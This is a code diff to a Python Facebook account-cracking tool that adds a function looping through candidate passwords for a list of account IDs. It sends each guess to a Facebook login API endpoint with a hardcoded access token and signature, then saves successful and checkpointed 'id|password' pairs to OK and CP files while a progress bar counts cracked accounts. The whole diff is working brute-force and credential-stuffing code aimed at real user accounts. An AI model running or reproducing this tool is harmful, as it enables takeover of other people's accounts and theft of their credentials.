@@ -1036,6 +1036,43 @@ def passwrd():
 def methodnew(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
+	ua = random.choice(free)
+	ua2 = random.choice(ugen2)
+	ses = requests.Session()
+	prog.update(des,description=f"{H2} • {bo}CRACK. NEW[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.advance(des)
+	for pw in pwv:
+		try:
+			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+idf+"&locale=en_US&password="+pw+"?&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
+			r = requests.get(url).text
+			j = json.loads(r)
+			error = j['error_msg']
+			if 'access_token' in j:
+				ok+=1
+				tree = Tree(f"  ")
+				tree.add(f"[bold green]{idf}|{pw}")
+				tree.add(f"[bold green]{ua}\n")
+				cetak(tree) 
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				break
+			elif 'www.facebook.com' in j["error_msg"]:
+				tree = Tree(f" ")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}\n")
+				cetak(tree)
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+		
+def methodnewbhg(idf,pwv):
+	global loop,ok,cp
+	bo = random.choice([m,k,h,b,u,x])
 	pers = loop*100/len(id2)
 	fff = '%'
 	prog.update(des,description=f"{H2} • {bo}CRACK[bold green] {loop}/{len(id)} [bold white]OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
